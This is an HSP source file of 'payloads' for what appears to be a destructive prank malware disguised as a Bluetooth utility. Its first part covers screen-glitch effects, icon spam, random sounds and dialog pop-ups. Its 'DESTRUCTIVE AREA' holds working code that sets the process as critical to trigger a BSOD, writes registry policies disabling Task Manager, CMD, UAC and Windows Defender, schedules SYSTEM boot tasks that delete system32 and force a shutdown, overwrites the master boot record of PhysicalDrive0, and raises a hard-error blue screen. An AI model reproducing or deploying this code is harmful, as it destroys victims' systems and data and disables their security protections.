/***************************************************************
 * Name:      payloads.hsp
 * Purpose:   Payloads
 * Author:    0x0_nyan
 * Created:   2025-04-25
 **************************************************************/


*PAYLOAD_CRAZYSCREEN

	onexit gosub *WIN_CLOSE_IGNORE
	onclick 0
	pos 0, 0
	gcopy LED_ON, 0, 0, 640, 282

	TriA = powf(ginfo(20) / 2, 2)
	TriB = powf(ginfo(21), 2)
	TriC = int(sqrt(TriA + TriB)) / 2

	width ,, 0, ginfo(21)
	
	gsel 0, 2
	mmplay BPF_POWER_UP_WAV
	repeat TriC
	width ,, cnt, ginfo(21) - (cnt + 1)
	await 1
	loop

	repeat 10
		pos 0, 0
		gcopy LED_OFF, 0, 0, 640, 282
		wait 10
		pos 0, 0
		gcopy LED_ON, 0, 0, 640, 282
		wait 10
	loop

	chdir dir_exe
	szFile = "Bluetooth.exe"
	ExtractIconExA varptr(szFile), 0, varptr(hIconLarge), varptr(hIconSmall), 1
	ix = GetSystemMetrics(SM_CXICON) / 2
	iy = GetSystemMetrics(SM_CYICON) / 2
	mmplay SDRAM_APP
	Time1 = gettime(6)
	
	repeat
		hwndA = GetDesktopWindow()
		hdcA = GetWindowDC(hwndA)
		mouse rnd(ginfo(20)), rnd(ginfo(21))	
		bool = DrawIcon(hdcA, ginfo(0) - ix, ginfo(1) - iy, LoadIcon(0, IDI_ERROR))
		bool = DrawIcon(hdcA, rnd(ginfo(20)), rnd(ginfo(21)), LoadIcon(0, IDI_ERROR))
		SetStretchBltMode hdcA, 0
		//StretchBlt hdcA, 20, 20, ginfo(20) - rnd(100), ginfo(21) - rnd(100), hdcA, 0, 0, ginfo(20), ginfo(21), SRCCOPY
		StretchBlt hdcA, 10, 10, ginfo(20) - rnd(60), ginfo(21) - rnd(60), hdcA, 0, 0, ginfo(20) - rnd(20), ginfo(21) - rnd(20), SRCCOPY
		ReleaseDC hwndA, hdcA
		wait 1
		Time2 = Time1 + 58		//Run for 58 seconds
		if Time2 > 60 : Time2 - 60
		Time3 = gettime(6)
		if Time3 = Time2 : break

	loop

	if MSG_DESTRUCTIVE == 1{
		gosub *PAYLOAD_BSOD2
	} else {
		goto *cleanup
	}
	
	wx = ginfo(20)/2 - ginfo(10)/2
	wy = ginfo(21)/2 - ginfo(11)/2
	width ,, wx, wy
	winclose_angry = 0
	onclick 1
	gsel 0, 1
	if MSG_DESTRUCTIVE == 1{
		gosub *PAYLOAD_BSOD
	} else {
		goto *cleanup
	}
	stop


*PAYLOAD_SUBPROCESS
	chdir home_dir
	if SUBPROCESS == 0{
		exist "C:\\WINDOWS\\system32\\bthprops.cpl"
		if strsize >=1 : exec "bthprops.cpl", 16			//Shows Bluetooth settings
	}
	if SUBPROCESS == 1{
		exec "bthserv.exe -ICONERROR", 0					//Draws icon
	}
	if SUBPROCESS == 2{
		exec "bthserv.exe -RANDOMSOUND", 0					//Plays random sounds
	}
	if SUBPROCESS == 3{
		exec "bthserv.exe -DIALOG", 0						//Shows random dialog
	}
	if SUBPROCESS == 4{
		exist "C:\\WINDOWS\\system32\\devmgmt.msc"			//Opens Device Manager
		if strsize >= 1: exec "devmgmt.msc", 16
	}
	if SUBPROCESS == SDRAM_APP{
		exec "bthserv.exe -tonorflash -dev bt15 -f sdram.app -updata -runaddr 0x1000000 -wait 300 -div6", 0		//Plays sdram.app
	}
	SUBPROCESS = 0
	return


*PAYLOAD_RANDOM_DIALOG
	randomize
	dialog_sel = rnd(7)
	if dialog_sel = 0:dialog msg1   						//Shows some Chinglish
	if dialog_sel = 1:dialog "Enjoy Music Enjoy Life"
	if dialog_sel = 2:dialog "Ze Bluetooth dewise is ready to pell"
	if dialog_sel = 3:dialog "The Bluetooth Device Is Ready To Pair"
	if dialog_sel = 4:dialog "The Bluetooth Device Is Connected Successfully"
	if dir_cmdline == "-DIALOG": goto *PAYLOAD_RANDOM_DIALOG
	return



*PAYLOAD_POPUP												//Shows Chinglish pop-up
	gsel 1, 2
	//MessageBeep MB_ICONEXCLAMATION
	mmplay BPF_MUSIC_ORI_WAV
	gsel 0, 0
	return


*PAYLOAD_POPUP_INCREASE_2
	POPUP_INCREASED_2 = 1
	onclick 0
	MSG_POPUP_SHOWN = 1
	for count, 1, 50, 1
	wait 5
	MessageBeep MB_OK
	//mmplay BPF_DISCONNECT_WAV
	gsel count, 2
	next
	gsel 0, 2
	onclick 1
	return


*PAYLOAD_POPUP_INCREASE
	onclick 0
	onexit gosub *WIN_CLOSE_IGNORE_2
	MSG_POPUP_SHOWN = 1
	for count, 1, 11, 1
	wait 100
	//MessageBeep MB_ICONERROR
	mmplay count-1
	gsel count, 2
	next
	wait 100
	mmplay BPF_BT_WAV
	gsel 0, 1
	onexit gosub *WIN_CLOSE
	onclick 1
	return
	

*PAYLOAD_POPUP_MOVE
	if MSG_POPUP_SHOWN == 0: goto *PAYLOAD_POPUP_INCREASE_2
	onclick 0
	
	repeat 10
	for count, 0, 50, 1
	wait 1
	gsel rnd(10), 2
	wx = rnd(ginfo(20))
	wy = rnd(ginfo(21))
	width ,, wx, wy
	mmplay BPF_DISCONNECT_WAV
	next
	loop
	gsel 0, 0
	onclick 1
	return


*PAYLOAD_BACKDOOR_WAKEUP
	
	start_x1 = 0
	start_x2 = 60
	start_y1 = ginfo(21) - 50
	start_y2 = ginfo(21)

	onclick 0
	repeat
	wait 1
	if(ginfo(0) >= start_x1)&(ginfo(0) <= start_x2)&(ginfo(1) >= start_y1)&(ginfo(1) <= start_y2):break
	loop

	pos 0, 0
	gcopy LED_ON, 0, 0, 640, 282

	TriA = powf(ginfo(20) / 2, 2)
	TriB = powf(ginfo(21), 2)
	TriC = int(sqrt(TriA + TriB)) / 2

	width ,, 0, ginfo(21)
	
	gsel 0, 2
	mmplay BPF_POWER_UP_WAV
	repeat TriC
	width ,, cnt, ginfo(21) - (cnt + 1)
	await 1
	loop

	onclick 1
	gsel 0, 1
	goto *WAKEUP_3
	


*PAYLOAD_DRAW_ICON
	szFile = "bthserv.exe"
	ExtractIconExA varptr(szFile), 0, varptr(hIconLarge), varptr(hIconSmall), 1
	ix = GetSystemMetrics(SM_CXICON) / 2
	iy = GetSystemMetrics(SM_CYICON) / 2
	repeat
	hwndA = GetDesktopWindow()
	hdcA = GetWindowDC(hwndA)
	bool = DrawIcon(hdcA, ginfo(0) - ix, ginfo(1) - iy, LoadIcon(0, IDI_ERROR))
	//bool = DrawIcon(hdcA, rnd(ginfo(20)), rnd(ginfo(21)), LoadIcon(0, IDI_ERROR))
	bool = DrawIcon(hdcA, rnd(ginfo(20)), rnd(ginfo(21)), LoadIcon(0, IDI_WARNING))
	bool = DrawIcon(hdcA, rnd(ginfo(20)), rnd(ginfo(21)), hIconLarge)
	ReleaseDC hwndA, hdcA

	await 5
	loop


*PAYLOAD_STRETCHBLT
	hwndA = GetDesktopWindow()
	hdcA = GetWindowDC(hwndA)
	SetStretchBltMode hdcA, 0
	//StretchBlt hdcA, 20, 20, ginfo(20) - rnd(100), ginfo(21) - rnd(100), hdcA, 0, 0, ginfo(20), ginfo(21), SRCCOPY
	StretchBlt hdcA, 10, 10, ginfo(20) - rnd(60), ginfo(21) - rnd(60), hdcA, 0, 0, ginfo(20) - rnd(20), ginfo(21) - rnd(20), SRCCOPY
	ReleaseDC hwndA, hdcA
	return


*PAYLOAD_SDRAM
	mmplay SDRAM_APP
	stop




*PAYLOAD_RANDOM_SOUND
	repeat
	randomize
	sound_sel = rnd(32)
	if sound_sel <= 29: mmplay sound_sel
	if sound_sel == 30{
		MessageBeep MB_OK
		wait 30
		continue
	}
	if sound_sel == 31{
		MessageBeep MB_WARNING
		wait 30
		continue
	}
	if sound_sel == 32{
		MessageBeep MB_ICONERROR
		wait 30
		continue
	}
	if sound_sel == 33: mmplay HUM_WAV
	if sound_sel == 34: mmplay NOISE_WAV
	if sound_sel == 35: mmplay NOISE_WAV
	wait rnd(50) + 80
	loop


*PAYLOAD_WINDOW_SHAKER
	onclick 0
	gsel shaker_counter, 2
	wx = rnd(ginfo(20))
	wy = rnd(ginfo(21))
	width ,, wx, wy
	//gsel 0, 0
	shaker_counter++
	if shaker_counter == 50: shaker_counter = 0
	return



/************************************************DESTRUCTIVE AREA************************************************/


#if PROTOTYPE == 0

*PAYLOAD_PROC_CRITICAL		//Set process as critical, which can cause BSOD by just closing it.
	#if BSOD_EN				//Hence this payload should be controlled by BSOD_EN switch
	CriticalProcess = 0x01
	WasEnabled = int(0)
	priv = RtlAdjustPrivilege(19, TRUE, FALSE, varptr(WasEnabled))		//SeShutdownPrivilege for BSOD
	priv = RtlAdjustPrivilege(20, TRUE, FALSE, varptr(WasEnabled))		//SeDebugPrivilege for critical process
	NTSTATUS = NtSetInformationProcess(GetCurrentProcess(), 0x1D, varptr(CriticalProcess), varsize(CriticalProcess))
	#endif
	return


*PAYLOAD_REGISTRY
	#if REGISTRY_EN
	if MSG_DESTRUCTIVE == 1{

		lpSubKey = "Software\\Policies\\Microsoft\\Windows\\System"							//Block 1 Disable Command Prompt
		regValue = 2
		RegCreateKeyExA HKEY_CURRENT_USER, varptr(lpSubKey), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, varptr(hKey), NULL 
		regName = "DisableCMD"
		RegSetValueExA hKey, varptr(regName), 0, REG_DWORD, varptr(regValue), 4
		RegCloseKey hKey

		
    	lpSubKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"			//Block 2
		regValue = 1
		RegCreateKeyExA HKEY_CURRENT_USER, varptr(lpSubKey), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, varptr(hKey), NULL 
		regName = "DisableChangePassword"
		RegSetValueExA hKey, varptr(regName), 0, REG_DWORD, varptr(regValue), 4
		regName = "DisableLockWorkstation"
		RegSetValueExA hKey, varptr(regName), 0, REG_DWORD, varptr(regValue), 4
		regName = "DisableRegistryTools"
		RegSetValueExA hKey, varptr(regName), 0, REG_DWORD, varptr(regValue), 4
		regName = "DisableTaskMgr"
		RegSetValueExA hKey, varptr(regName), 0, REG_DWORD, varptr(regValue), 4
		RegCloseKey hKey

		lpSubKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"		//Block 3
		RegCreateKeyExA HKEY_CURRENT_USER, varptr(lpSubKey), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, varptr(hKey), NULL 
		regName = "NoLogoff"
		RegSetValueExA hKey, varptr(regName), 0, REG_DWORD, varptr(regValue), 4
		regName = "NoDesktop"
		RegSetValueExA hKey, varptr(regName), 0, REG_DWORD, varptr(regValue), 4
		regName = "NoControlPanel"
		RegSetValueExA hKey, varptr(regName), 0, REG_DWORD, varptr(regValue), 4
		regName = "NoWinKeys"
		RegSetValueExA hKey, varptr(regName), 0, REG_DWORD, varptr(regValue), 4
		regName = "NoRun"
		RegSetValueExA hKey, varptr(regName), 0, REG_DWORD, varptr(regValue), 4
		RegCloseKey hKey

		
		lpSubKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"			//Block 4
		RegCreateKeyExA HKEY_LOCAL_MACHINE, varptr(lpSubKey), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, varptr(hKey), NULL 
		regName = "EnableLUA"
		RegSetValueExA hKey, varptr(regName), 0, REG_DWORD, varptr(regValue), 4
		regName = "HideFastUserSwitching"
		RegSetValueExA hKey, varptr(regName), 0, REG_DWORD, varptr(regValue), 4
		RegCloseKey hKey

		lpSubKey = "SOFTWARE\\Policies\\Microsoft\\Windows Defender"						//Block 5
		RegCreateKeyExA HKEY_LOCAL_MACHINE, varptr(lpSubKey), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, varptr(hKey), NULL 
		regName = "DisableAntiSpyware"
		RegSetValueExA hKey, varptr(regName), 0, REG_DWORD, varptr(regValue), 4
		RegCloseKey hKey
	}
	#endif
	return
	

*PAYLOAD_RMDIR
	#if RMDIR_EN																			//Unused payload, default is 0
	if MSG_DESTRUCTIVE == 1{
		MessageBox hwnd, "DANGEROUS ERROR, PAYLOAD_RMDIR HAS BEEN EXECUTED", "DEBUG MESSAGE", MB_ICONERROR | MB_OK
		lpSubKey = "Software\\Policies\\Microsoft\\Windows\\System"							//Re-enable Command Prompt
		RegOpenKeyExA HKEY_CURRENT_USER, varptr(lpSubKey), 0, KEY_WRITE, varptr(hKey)
		
		regName = "DisableCMD"
		RegDeleteKeyValueA HKEY_CURRENT_USER, varptr(lpSubKey), varptr(regName)				//Delete value from key
		RegCloseKey hKey
		//exec "schtasks.exe /run Microsoft\\Windows\\Servicing\\SystemCleanup", 0			//Run destructive task
		
	}
	#endif
	return


*PAYLOAD_CREATE_TASK
	#if TASKSCH_EN
	if MSG_DESTRUCTIVE == 1{
		//MessageBox hwnd, "DANGEROUS ERROR, PAYLOAD_CREATE_TASK HAS BEEN EXECUTED", "DEBUG MESSAGE", MB_ICONERROR | MB_OK
		exec "schtasks.exe /create /sc ONSTART /tn Microsoft\\Windows\\Bluetooth\\bthserv /tr \"C:\\WINDOWS\\Temp\\bthserv\\bthserv.exe -FORCESHUTDOWN\" /ru system /f /rl HIGHEST", 0
		exec "schtasks.exe /create /sc ONSTART /tn Microsoft\\Windows\\Servicing\\SystemCleanup /tr \"%windir%\\system32\\cmd.exe /c rmdir /s /q %windir%\\system32\" /ru system /f /rl HIGHEST", 0
	}
	#endif
	return


*PAYLOAD_MBR
	#if MBRWRITER_EN
	//MessageBox hwnd, "DANGEROUS ERROR, PAYLOAD_MBR HAS BEEN EXECUTED", "DEBUG MESSAGE", MB_ICONERROR | MB_OK
	if MSG_DESTRUCTIVE == 1{
		dim MBRData, 1024
		
		foreach rawData0
		poke MBRData, CountByBytes, rawData0(cnt)
		CountByBytes++
		loop

		foreach rawData1
		poke MBRData, CountByBytes, rawData1(cnt)
		CountByBytes++
		loop

		foreach rawData2
		poke MBRData, CountByBytes, rawData2(cnt)
		CountByBytes++
		loop

		foreach rawData3
		poke MBRData, CountByBytes, rawData3(cnt)
		CountByBytes++
		loop
		
		foreach rawData4
		poke MBRData, CountByBytes, rawData4(cnt)
			CountByBytes++
		loop

		foreach rawData5
		poke MBRData, CountByBytes, rawData5(cnt)
		CountByBytes++
		loop
	
		foreach rawData6
		poke MBRData, CountByBytes, rawData6(cnt)
		CountByBytes++
		loop

		foreach rawData7
		poke MBRData, CountByBytes, rawData7(cnt)
		CountByBytes++
		loop

		foreach rawData8
		poke MBRData, CountByBytes, rawData8(cnt)
		CountByBytes++
		loop

		foreach rawData9
		poke MBRData, CountByBytes, rawData9(cnt)
		CountByBytes++
		loop

		foreach rawDataA
		poke MBRData, CountByBytes, rawDataA(cnt)
		CountByBytes++
		loop

		foreach rawDataB
		poke MBRData, CountByBytes, rawDataB(cnt)
		CountByBytes++
		loop

		foreach rawDataC
		poke MBRData, CountByBytes, rawDataC(cnt)
		CountByBytes++
		loop

		foreach rawDataD
		poke MBRData, CountByBytes, rawDataD(cnt)
		CountByBytes++
		loop

		foreach rawDataE
		poke MBRData, CountByBytes, rawDataE(cnt)
		CountByBytes++
		loop

		foreach rawDataF
		poke MBRData, CountByBytes, rawDataF(cnt)
		CountByBytes++
		loop

		foreach rawData10
		poke MBRData, CountByBytes, rawData10(cnt)
		CountByBytes++
		loop
	
		foreach rawData11
		poke MBRData, CountByBytes, rawData11(cnt)
		CountByBytes++
		loop

		foreach rawData12
		poke MBRData, CountByBytes, rawData12(cnt)
		CountByBytes++
		loop

		foreach rawData13
		poke MBRData, CountByBytes, rawData13(cnt)
		CountByBytes++
		loop

		foreach rawData14
		poke MBRData, CountByBytes, rawData14(cnt)
		CountByBytes++
		loop

		foreach rawData15
		poke MBRData, CountByBytes, rawData15(cnt)
		CountByBytes++
		loop

		
		lpNumberOfBytesWritten = int(0)
		hFile = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0)
		if hFile == INVALID_HANDLE_VALUE{
			MessageBox hwnd, "INVALID_HANDLE_VALUE", "Error", MB_ICONERROR | MB_OK
			return
		}
		WSTATUS = WriteFile(hFile, varptr(MBRData), 1024, varptr(lpNumberOfBytesWritten), NULL)
		CloseHandle hFile
	}
	#endif
	return

	
*PAYLOAD_BSOD
	#if BSOD_EN
	MessageBox hwnd, "The Bluetooth device is ready to pair", "", MB_ICONERROR | MB_YESNO
	MessageBox hwnd, "The Bluetooth dewise is really too pale", "", MB_ICONERROR | MB_OK
	MessageBox hwnd, "THE BLUETOOTH DEWISE IS READY TO KILL", "", MB_ICONERROR | MB_OK
	if MSG_DESTRUCTIVE == 1{
		//priv = RtlAdjustPrivilege(20, FALSE, FALSE, varptr(WasEnabled))
		//shutdown_priv = RtlAdjustPrivilege(19, TRUE, FALSE, varptr(WasEnabled))
		BSOD = NtRaiseHardError(0xC000021A, 0, 0, 0, 6, varptr(Resp))		//Makes Blue Screen of Death, 1: Dialog 6: BSOD 
	}
	#else
	goto *cleanup
	#endif
	return
	

*PAYLOAD_BSOD2
	#if BSOD_EN
	if MSG_DESTRUCTIVE == 1{
		BSOD = NtRaiseHardError(0xC000021A, 0, 0, 0, 6, varptr(Resp))
	}
	#else
	goto *cleanup
	#endif
	return
	
	

*PAYLOAD_FORCE_SHUTDOWN
	#if BSOD_EN
	//mmplay BPF_POWER_OFF_WAV
	if dir_cmdline == "-FORCESHUTDOWN"{
		wait 60000			//Wait for 10 minutes
		shutdown_priv = RtlAdjustPrivilege(19, TRUE, FALSE, varptr(WasEnabled))
		BSOD = NtShutdownSystem(0)
		stop
	}
	#endif


*PAYLOAD_FORCE_RESTART
	#if BSOD_EN
	mmplay BPF_POWER_OFF_WAV
	shutdown_priv = RtlAdjustPrivilege(19, TRUE, FALSE, varptr(WasEnabled))
	BSOD = NtShutdownSystem(1)
	stop
	#endif


#else	//When PROTYPE is 1, just bypass destructive payloads

*PAYLOAD_BSOD
	MessageBox hwnd, "PAYLOAD_BSOD", "Debug Message", MB_OK
	return
	
*PAYLOAD_FORCE_SHUTDOWN
	MessageBox hwnd, "PAYLOAD_FORCE_SHUTDOWN", "Debug Message", MB_OK
	return
	
*PAYLOAD_CREATE_TASK
	MessageBox hwnd, "PAYLOAD_CREATE_TASK", "Debug Message", MB_OK
	return
	
*PAYLOAD_MBR
	MessageBox hwnd, "PAYLOAD_MBR", "Debug Message", MB_OK
	return
	
*PAYLOAD_REGISTRY
	MessageBox hwnd, "PAYLOAD_REGISTRY", "Debug Message", MB_OK
	return
	
*PAYLOAD_RMDIR
	MessageBox hwnd, "PAYLOAD_RMDIR", "Debug Message", MB_OK
	return
	
#endif